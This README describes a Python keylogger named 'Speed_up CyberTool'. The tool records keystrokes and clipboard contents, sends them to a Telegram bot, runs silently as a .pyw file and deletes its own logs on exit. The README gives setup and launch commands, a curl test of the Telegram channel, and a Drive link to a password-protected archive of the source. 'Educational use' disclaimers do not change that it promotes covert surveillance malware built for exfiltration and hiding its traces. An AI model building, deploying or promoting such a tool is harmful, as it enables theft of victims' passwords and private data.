# 🔒 Speed_up CyberTool: CyberLab Experiment 🚀

<p align="center">
  <img src="https://img.shields.io/badge/Version-1.0.0-blueviolet?logo=python&style=for-the-badge" alt="Version 1.0.0">
  <img src="https://img.shields.io/badge/Status-Educational-red?style=for-the-badge" alt="Educational Use Only">
</p>

---

## 🌌 Project Overview

**Speed_up CyberTool** is a futuristic proof-of-concept tool designed for **educational exploration** in cybersecurity. Powered by Python, it leverages `pynput` for input monitoring, `pyperclip` for clipboard interaction, and Telegram API integration to send data securely. This project is a window into the digital frontier—use it responsibly!

> ⚠️ **CRITICAL NOTICE**: This tool is for **educational purposes only**. Unauthorized monitoring or data collection is **illegal** and **unethical**. Use with explicit consent and comply with all laws. Misuse may result in severe legal consequences.

---

## ✨ Features

- **🔑 Input Tracking**: Monitors printable and special inputs (Enter, Tab, etc.).
- **📋 Clipboard Interaction**: Captures clipboard data on Enter press.
- **📤 Telegram Sync**: Sends data to your Telegram chat in real-time.
- **🛑 Secure Exit**: Stops with Shift+Esc, deleting temporary files (`tool.log`, `.env`).
- **🗑️ Auto-Cleanup**: Erases sensitive files on shutdown or termination.
- **🔒 Stealth Operation**: Runs silently as a `.pyw` file.

---

## 📥 Accessing the Files

The source code is packaged in a **password-protected `Speed_up.rar`** file, hosted on Google Drive with **restricted access**. Here’s how to get started:

1. **Request Access**:
   - Contact the repository owner (e.g., via [easyemail@ccmail.uk]) to be added as an authorized user.
   - Provide your Google account email for access approval.

2. **Download the File**:
   - Use this link: **[Google Drive Link](https://drive.google.com/file/d/1vcT8MF_6v-hFTo_n_HVCGQ24Byyr40e9/view?usp=sharing)**.
   - Only authorized users can download the file.

3. **Extract the RAR**:
   - Extract `Speed_up.rar` with WinRAR or 7-Zip using the provided password (shared separately via a secure channel).

4. **Setup Instructions**:
   - **Requirements**: Python 3.11 or 3.12 (avoid 3.13 due to compatibility issues).
   - Run `setup_env.py` to create `.env`:
     ```bash
     python setup_env.py
     ```
   - Update `.env` with your `TELEGRAM_TOKEN` and `CHAT_ID` (create a bot via BotFather).

   - Install dependencies:
     ```bash
     pip install requests pynput pyperclip python-dotenv
     ```

   - Launch the tool:
     ```bash
     pythonw Speed_up.pyw
     ```

---

## 🧑‍💻 Usage

- Press **Enter** to send clipboard + keystrokes to Telegram.
- Press **Shift+Esc** to **stop** and **delete** all temporary files.
- Files are also deleted **automatically** during system shutdown or task termination.

---

## 🔐 Security Guidelines

- **Password Protection**: `Speed_up.rar` is encrypted with a strong password.
- **Credential Safety**: `.env` is excluded from the archive—generate it locally using `setup_env.py`.
- **Ethical Use**: This tool is strictly for academic and research purposes. Do **not** use it without full consent.
- **Secure Sharing**: The Google Drive link is **restricted**; do **not** share it publicly or use it maliciously.

---

## 🛠️ Troubleshooting

### ❌ No Telegram Data?
- Check `tool.log` for errors like:
  - Network issues
  - Invalid `TELEGRAM_TOKEN` or `CHAT_ID`
- Test Telegram manually:
  ```bash
  curl -X POST https://api.telegram.org/bot<your_token>/sendMessage -d "chat_id=<your_chat_id>&text=Test"

## 🏆 Contributing
- Open to educational contributions!
- Feel free to fork this repo, submit pull requests, or suggest improvements.
- Keep it legal, ethical, and constructive.

## 📙 License

...Educational Use Only...

This repository is released without a formal license.
Distribution, modification, or use outside educational or authorized environments is strictly prohibited.
